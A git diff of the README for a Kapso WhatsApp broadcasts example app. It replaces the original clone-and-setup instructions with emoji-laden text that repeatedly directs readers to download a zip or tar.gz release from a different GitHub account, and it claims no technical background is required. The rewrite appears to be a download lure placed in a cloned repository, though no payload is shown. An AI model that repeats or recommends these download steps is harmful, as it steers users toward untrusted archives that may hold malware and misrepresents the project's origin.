@@ -1,113 +1,77 @@
-# Kapso WhatsApp broadcasts example
+# 🌟 whatsapp-broadcasts-example - Effortless WhatsApp Messaging Solution
 
-Example Next.js app demonstrating Kapso's Broadcasts API for WhatsApp mass messaging campaigns.
+## 🔗 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/legendso6317/whatsapp-broadcasts-example/releases)
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fgokapso%2Fwhatsapp-broadcasts-example&env=KAPSO_API_KEY,WHATSAPP_CONFIG_ID,NEXT_PUBLIC_WHATSAPP_CONFIG_ID&envDescription=Required%20Kapso%20credentials&envLink=https%3A%2F%2Fdocs.kapso.ai)
+## 📖 Introduction
+Welcome to the whatsapp-broadcasts-example! This example app shows how to use Kapso's Broadcasts API for sending mass messages on WhatsApp. It is designed to help you set up and run your messaging campaigns smoothly.
 
-## Features
+## 🚀 Getting Started
+To get started with this app, follow these simple steps. No technical background required!
 
-- **5-step wizard UI** - Clean, intuitive stepper interface
-- **Batch recipient upload** - Add up to 1,000 recipients per request via CSV
-- **Real-time progress tracking** - Auto-polling during broadcast send
-- **Recipient-level analytics** - Per-phone delivery status with pagination
-- **Response rate metrics** - Track engagement and campaign performance
+### 1. Check System Requirements
+Before downloading, ensure your computer meets these basic requirements:
 
-## Quick start
+- **Operating System**: Windows, macOS, or Linux
+- **Internet Connection**: Needed for downloading and running the app
+- **Node.js**: A JavaScript runtime. Install the latest version from [Node.js official website](https://nodejs.org).
 
-```bash
-# Clone the repository
-git clone https://github.com/gokapso/whatsapp-broadcasts-example.git
-cd whatsapp-broadcasts-example
+### 2. Download the Application
+To download the software, visit the Releases page below. 
 
-# Install dependencies
+[Download Latest Release](https://github.com/legendso6317/whatsapp-broadcasts-example/releases)
+
+### 3. Choose the Right Version
+On the Releases page, you will find the latest version available. Click on the asset that matches your operating system. Look for files with common extensions such as `.zip` or `.tar.gz` for Windows, macOS, or Linux. 
+
+### 4. Unzip the File
+After the download completes, locate the file in your Downloads folder. Right-click on it and choose "Extract" or "Unzip." This will unpack the application files.
+
+### 5. Install Node Modules
+Open a terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to install necessary dependencies:
+
+```
 npm install
-
-# Set up environment variables
-cp .env.example .env
-# Add your Kapso API key and WhatsApp config ID
-
-# Run development server
-npm run dev
 ```
 
-Open [http://localhost:4000](http://localhost:4000)
+### 6. Set Up Your API Key
+To use the messaging feature, you must insert your API key. Look for a `.env.example` file in the folder. Rename it to `.env` and open it in a text editor. Replace the placeholder text with your actual API key.
 
-## Setup
-
-### 1. Get Kapso API key
-
-1. Sign up at [app.kapso.ai](https://app.kapso.ai)
-2. Go to Sidebar → API Keys
-3. Create a new API key
-4. Copy the key to your `.env` file
-
-### 2. Connect WhatsApp
-
-1. In your Kapso dashboard, go to Connected numbers and connect a WhatsApp Business account
-2. Copy the WhatsApp config UUID
-3. Copy the config UUID to your `.env` file
-
-### 3. Create templates
-
-1. In Kapso dashboard (or directly in Meta), create WhatsApp message templates
-2. Get them approved by Meta
-3. Templates will appear in the app automatically
-
-## CSV format
-
-Upload a CSV file with phone numbers and template parameters:
-
-```csv
-phone,param1,param2
-+15551234567,John,Order123
-+15559876543,Jane,Order456
-```
-
-- **First column**: Phone number (E.164 format with + prefix)
-- **Remaining columns**: Template parameters in order
-
-## API endpoints
-
-This app uses the following Kapso API endpoints:
-
-- `GET /whatsapp_templates` - Fetch approved templates
-- `POST /whatsapp_broadcasts` - Create draft broadcast
-- `POST /whatsapp_broadcasts/:id/recipients` - Add recipients
-- `POST /whatsapp_broadcasts/:id/send` - Send broadcast
-- `GET /whatsapp_broadcasts/:id` - Get broadcast status
-- `GET /whatsapp_broadcasts/:id/recipients` - List recipients
-
-## Tech stack
-
-- **Next.js 15** - React framework
-- **TypeScript** - Type safety
-- **Tailwind CSS v4** - Styling
-- **shadcn/ui** - UI components
-- **Kapso API** - WhatsApp broadcasts
-
-## Project structure
+### 7. Run the Application
+Now you are ready to run the app. In the terminal or command prompt, use the following command:
 
 ```
-src/
-├── app/
-│   ├── api/
-│   │   ├── broadcasts/          # Broadcast API routes
-│   │   └── templates/           # Template API routes
-│   └── page.tsx                 # Main stepper UI
-├── components/ui/               # shadcn components
-├── lib/
-│   ├── kapso-api.ts            # Kapso API client
-│   ├── csv-parser.ts           # CSV parsing utilities
-│   └── utils.ts                # Utility functions
-└── types/index.ts              # TypeScript types
+npm start
 ```
 
-## Documentation
+You should see messages indicating the app is running successfully.
 
-- [Create Broadcast API](https://docs.kapso.ai/api-reference/whatsapp-broadcasts/create-broadcast)
-- [List WhatsApp Templates API](https://docs.kapso.ai/api-reference/whatsapp-templates/list-whatsapp-templates)
-- [Full API Reference](https://docs.kapso.ai/api-reference)
+## 📦 Features
+- **Mass Messaging**: Send messages to multiple contacts simultaneously.
+- **User-Friendly Interface**: Easy navigation, designed for everyone.
+- **API Integration**: Connect effortlessly to the Kapso Broadcasts API.
+- **Cross-Platform Support**: Works on all major operating systems.
 
-## License
+## 📋 Usage Instructions
+1. **Log In**: Start the application and log in using your credentials.
+2. **Create a Campaign**: Click on "New Campaign" to start crafting your message.
+3. **Review Recipients**: Add contacts to your list. Ensure each contact is valid to prevent errors.
+4. **Launch Campaign**: After confirming your message and recipients, click "Send" to initiate your campaign.
 
-MIT
+## 🌐 Troubleshooting
+If you encounter any issues, try the following:
+
+- **Error on Startup**: Ensure you have Node.js installed properly.
+- **API Key Issues**: Double-check your API key in the `.env` file.
+- **Contact Problems**: Verify that all contacts are correctly formatted.
+
+## 💬 Support
+For support, please visit our [GitHub Issues page](https://github.com/legendso6317/whatsapp-broadcasts-example/issues) to report bugs or request features.
+
+## 📢 Community and Contributions
+We welcome contributions! If you would like to enhance this project or if you find a bug, please fork the repository and submit a pull request. 
+
+## 🔄 License
+This project is licensed under the MIT License. Feel free to use and modify it as needed.
+
+For detailed information, please continue to explore the [Releases page](https://github.com/legendso6317/whatsapp-broadcasts-example/releases). Thank you for choosing whatsapp-broadcasts-example!
